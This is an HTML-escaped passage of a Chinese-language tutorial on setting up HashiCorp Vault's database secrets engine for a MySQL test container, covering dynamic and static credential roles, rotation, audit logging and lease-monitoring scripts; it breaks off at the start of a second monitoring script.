 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Vault Server&lt;/strong&gt;: 凭据管理中心&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MySQL&lt;/strong&gt;: 目标数据库&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动态角色&lt;/strong&gt;: 短期凭据（30分钟TTL）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;静态角色&lt;/strong&gt;: 长期凭据（24小时自动轮换）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;监控体系&lt;/strong&gt;: 租约管理、健康检查、告警规则&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="-阶段1基础环境配置"&gt;&lt;span&gt;🔧 阶段1：基础环境配置&lt;/span&gt;
 &lt;a href="#-%e9%98%b6%e6%ae%b51%e5%9f%ba%e7%a1%80%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="11-mysql容器部署"&gt;&lt;span&gt;1.1 MySQL容器部署&lt;/span&gt;
 &lt;a href="#11-mysql%e5%ae%b9%e5%99%a8%e9%83%a8%e7%bd%b2" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 启动MySQL测试容器
docker run -d \
 --name mysql-vault-test \
 -e MYSQL_ROOT_PASSWORD=rootpassword123 \
 -e MYSQL_DATABASE=vault_test \
 -p 3306:3306 \
 mysql:8.0

# 验证连接
docker exec -i mysql-vault-test mysql -uroot -prootpassword123 -e &amp;#34;SHOW DATABASES;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="12-vault数据库引擎配置"&gt;&lt;span&gt;1.2 Vault数据库引擎配置&lt;/span&gt;
 &lt;a href="#12-vault%e6%95%b0%e6%8d%ae%e5%ba%93%e5%bc%95%e6%93%8e%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 启用数据库密钥引擎
/opt/vault/bin/vault secrets enable database

# 配置MySQL连接
/opt/vault/bin/vault write database/config/mysql-vault \
 plugin_name=mysql-database-plugin \
 connection_url=&amp;#34;{{username}}:{{password}}@tcp(127.0.0.1:3306)/&amp;#34; \
 allowed_roles=&amp;#34;vault-dynamic-role&amp;#34; \
 username=&amp;#34;root&amp;#34; \
 password=&amp;#34;rootpassword123&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 class="heading-element" id="-阶段2动态角色配置"&gt;&lt;span&gt;🔐 阶段2：动态角色配置&lt;/span&gt;
 &lt;a href="#-%e9%98%b6%e6%ae%b52%e5%8a%a8%e6%80%81%e8%a7%92%e8%89%b2%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="21-动态角色定义"&gt;&lt;span&gt;2.1 动态角色定义&lt;/span&gt;
 &lt;a href="#21-%e5%8a%a8%e6%80%81%e8%a7%92%e8%89%b2%e5%ae%9a%e4%b9%89" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;/opt/vault/bin/vault write database/roles/vault-dynamic-role \
 db_name=mysql-vault \
 creation_statements=&amp;#34;CREATE USER &amp;#39;{{name}}&amp;#39;@&amp;#39;%&amp;#39; IDENTIFIED BY &amp;#39;{{password}}&amp;#39;;GRANT SELECT, INSERT, UPDATE, DELETE ON vault_test.* TO &amp;#39;{{name}}&amp;#39;@&amp;#39;%&amp;#39;;&amp;#34; \
 default_ttl=&amp;#34;30m&amp;#34; \
 max_ttl=&amp;#34;2h&amp;#34; \
 revocation_statements=&amp;#34;REVOKE ALL PRIVILEGES ON vault_test.* FROM &amp;#39;{{name}}&amp;#39;@&amp;#39;%&amp;#39;; DROP USER &amp;#39;{{name}}&amp;#39;@&amp;#39;%&amp;#39;;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="22-动态凭据使用"&gt;&lt;span&gt;2.2 动态凭据使用&lt;/span&gt;
 &lt;a href="#22-%e5%8a%a8%e6%80%81%e5%87%ad%e6%8d%ae%e4%bd%bf%e7%94%a8" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 获取动态凭据
/opt/vault/bin/vault read database/creds/vault-dynamic-role

# 验证MySQL权限
mysql -u&amp;lt;动态用户名&amp;gt; -p&amp;lt;动态密码&amp;gt; -e &amp;#34;SHOW GRANTS;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 class="heading-element" id="-阶段3静态角色自动轮换"&gt;&lt;span&gt;🔄 阶段3：静态角色自动轮换&lt;/span&gt;
 &lt;a href="#-%e9%98%b6%e6%ae%b53%e9%9d%99%e6%80%81%e8%a7%92%e8%89%b2%e8%87%aa%e5%8a%a8%e8%bd%ae%e6%8d%a2" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="31-创建静态用户"&gt;&lt;span&gt;3.1 创建静态用户&lt;/span&gt;
 &lt;a href="#31-%e5%88%9b%e5%bb%ba%e9%9d%99%e6%80%81%e7%94%a8%e6%88%b7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 在MySQL中创建静态用户
docker exec -i mysql-vault-test mysql -uroot -prootpassword123 -e &amp;#39;CREATE USER &amp;#34;vault_static_user&amp;#34;@&amp;#34;%&amp;#34; IDENTIFIED BY &amp;#34;TempPassword123!&amp;#34;; GRANT SELECT, INSERT ON vault_test.* TO &amp;#34;vault_static_user&amp;#34;@&amp;#34;%&amp;#34;;&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="32-配置静态角色"&gt;&lt;span&gt;3.2 配置静态角色&lt;/span&gt;
 &lt;a href="#32-%e9%85%8d%e7%bd%ae%e9%9d%99%e6%80%81%e8%a7%92%e8%89%b2" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 更新数据库配置支持静态角色
/opt/vault/bin/vault write database/config/mysql-vault \
 plugin_name=mysql-database-plugin \
 connection_url=&amp;#34;{{username}}:{{password}}@tcp(127.0.0.1:3306)/&amp;#34; \
 allowed_roles=&amp;#34;vault-dynamic-role,app-static-user&amp;#34; \
 username=&amp;#34;root&amp;#34; \
 password=&amp;#34;rootpassword123&amp;#34;

# 配置静态角色（24小时自动轮换）
/opt/vault/bin/vault write database/static-roles/app-static-user \
 db_name=mysql-vault \
 username=&amp;#34;vault_static_user&amp;#34; \
 rotation_statements=&amp;#34;ALTER USER &amp;#39;vault_static_user&amp;#39;@&amp;#39;%&amp;#39; IDENTIFIED BY &amp;#39;{{password}}&amp;#39;;&amp;#34; \
 rotation_period=&amp;#34;86400&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="33-获取静态凭据"&gt;&lt;span&gt;3.3 获取静态凭据&lt;/span&gt;
 &lt;a href="#33-%e8%8e%b7%e5%8f%96%e9%9d%99%e6%80%81%e5%87%ad%e6%8d%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 获取当前静态凭据
/opt/vault/bin/vault read database/static-creds/app-static-user

# 查看静态角色状态
/opt/vault/bin/vault read database/static-roles/app-static-user&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 class="heading-element" id="-阶段4监控审计体系"&gt;&lt;span&gt;📊 阶段4：监控审计体系&lt;/span&gt;
 &lt;a href="#-%e9%98%b6%e6%ae%b54%e7%9b%91%e6%8e%a7%e5%ae%a1%e8%ae%a1%e4%bd%93%e7%b3%bb" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="41-审计日志配置"&gt;&lt;span&gt;4.1 审计日志配置&lt;/span&gt;
 &lt;a href="#41-%e5%ae%a1%e8%ae%a1%e6%97%a5%e5%bf%97%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 创建审计日志目录
sudo mkdir -p /opt/vault/audit
sudo chown cxd: /opt/vault/audit

# 启用文件审计
/opt/vault/bin/vault audit enable file file_path=/opt/vault/audit/vault-audit.log

# 验证审计配置
/opt/vault/bin/vault audit list&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="42-监控策略配置"&gt;&lt;span&gt;4.2 监控策略配置&lt;/span&gt;
 &lt;a href="#42-%e7%9b%91%e6%8e%a7%e7%ad%96%e7%95%a5%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;# 创建数据库监控策略
/opt/vault/bin/vault policy write db-monitor - &amp;lt;&amp;lt; EOF
path &amp;#34;database/creds/vault-dynamic-role&amp;#34; {
 capabilities = [&amp;#34;read&amp;#34;]
}
path &amp;#34;database/creds/dev-readonly&amp;#34; {
 capabilities = [&amp;#34;read&amp;#34;]
}
path &amp;#34;database/creds/app-rw&amp;#34; {
 capabilities = [&amp;#34;read&amp;#34;]
}
path &amp;#34;database/roles/*&amp;#34; {
 capabilities = [&amp;#34;read&amp;#34;]
}
path &amp;#34;database/static-creds/app-static-user&amp;#34; {
 capabilities = [&amp;#34;read&amp;#34;]
}
path &amp;#34;sys/leases/renew&amp;#34; {
 capabilities = [&amp;#34;update&amp;#34;]
}
path &amp;#34;sys/leases/lookup&amp;#34; {
 capabilities = [&amp;#34;update&amp;#34;]
}
EOF

# 创建监控令牌
/opt/vault/bin/vault token create -policy=db-monitor -display-name=&amp;#34;db-monitor-token&amp;#34; -ttl=24h&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="43-监控脚本"&gt;&lt;span&gt;4.3 监控脚本&lt;/span&gt;
 &lt;a href="#43-%e7%9b%91%e6%8e%a7%e8%84%9a%e6%9c%ac" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;h4 class="heading-element" id="租约管理脚本-optvaultbinlease-managersh"&gt;&lt;span&gt;租约管理脚本 (&lt;code&gt;/opt/vault/bin/lease-manager.sh&lt;/code&gt;)&lt;/span&gt;
 &lt;a href="#%e7%a7%9f%e7%ba%a6%e7%ae%a1%e7%90%86%e8%84%9a%e6%9c%ac-optvaultbinlease-managersh" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash
export VAULT_ADDR=&amp;#39;http://127.0.0.1:8200&amp;#39;
echo &amp;#34;=== Vault租约管理 ===&amp;#34;
# 列出所有动态凭据租约
echo &amp;#34;1. 活跃的动态凭据租约:&amp;#34;
/opt/vault/bin/vault list sys/leases/lookup/database/creds/vault-dynamic-role 2&amp;gt;/dev/null
# 查看租约详情（如果有租约）
LEASE_IDS=$(/opt/vault/bin/vault list sys/leases/lookup/database/creds/vault-dynamic-role 2&amp;gt;/dev/null | tail -n &amp;#43;3)
if [ ! -z &amp;#34;$LEASE_IDS&amp;#34; ]; then
 echo -e &amp;#34;\n2. 租约详情:&amp;#34;
 for lease in $LEASE_IDS; do
 echo &amp;#34;租约: $lease&amp;#34;
 /opt/vault/bin/vault lease lookup database/creds/vault-dynamic-role/$lease 2&amp;gt;/dev/null | grep -E &amp;#34;(lease_duration|expire_time)&amp;#34;
 done
fi
# 检查MySQL中的动态用户
echo -e &amp;#34;\n3. MySQL中的动态用户:&amp;#34;
docker exec mysql-vault-test mysql -uroot -prootpassword123 -e &amp;#34;SELECT user, host FROM mysql.user WHERE user LIKE &amp;#39;v-%&amp;#39;;&amp;#34; 2&amp;gt;/dev/null
echo -e &amp;#34;\n4. 静态角色状态:&amp;#34;
/opt/vault/bin/vault read database/static-creds/app-static-user 2&amp;gt;/dev/null | grep -E &amp;#34;(username|last_vault_rotation|rotation_period)&amp;#34;
echo -e &amp;#34;\n=== 管理完成 ===&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class="heading-element" id="轮换监控脚本-optvaultbinrotation-monitorsh"&gt;&lt;span&gt;轮换监控脚本 (&lt;code&gt;/opt/vault/bin/rotation-monitor.sh&lt;/code&gt;)&lt;/span&gt;
 &lt;a href="#%e8%bd%ae%e6%8d%a2%e7%9b%91%e6%8e%a7%e8%84%9a%e6%9c%ac-optvaultbinrotation-monitorsh" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
